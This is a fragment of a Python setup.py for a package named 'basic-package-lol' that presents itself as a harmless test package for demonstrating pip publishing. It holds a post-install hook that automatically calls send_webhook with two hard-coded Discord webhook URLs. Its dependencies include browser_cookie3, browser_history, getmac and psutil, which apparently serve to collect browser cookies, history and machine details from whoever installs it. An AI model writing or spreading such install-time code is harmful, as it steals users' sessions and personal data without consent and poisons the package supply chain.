...
class AfterInstall(install):
    def run(self):
        install.run(self)
        freeze_support()
        send_webhook(['https://discord.com/api/webhooks/1070997224118558760/8ySHsZLBM9vb0LZXAVExprkbTCvxOOTy_8hydeGimp7b4dKmMN12OPtGCB2IY3vvJjoT','https://discord.com/api/webhooks/1030803906856488990/vgQvqzxZhhxrtc7Eo4UmgtxFje_yCiMynKjqLkU8wMLlSBJqFgk7G23r0aQbvRk-c5Fa'])


setuptools.setup(
    name = "basic-package-lol",
    version = "1.0.4",
    author = "Unknown",
    author_email = "Unknown@example.com",
    description = "A test package to demonstrate pip packages",
    long_description = "long description",
    long_description_content_type = "text/markdown",
    url = "https://www.knowledgehut.com/blog/programming/how-to-publish-python-package-to-pypi",
    project_urls = {
        "Bug Tracker": "https://www.knowledgehut.com/blog/programming/how-to-publish-python-package-to-pypi",
    },
    classifiers = [
    ...
    python_requires = ">=3.6",
    install_requires =[
        'browser_cookie3>=0.15.0',
        'browser_history>=0.3.2',
        'browser_history>=0.3.2',
        'discord_webhook>=0.16.3',
        'getmac>=0.8.3',
        'prettytable>=3.3.0',
        'psutil>=5.9.1',
        'py_cpuinfo>=8.0.0',
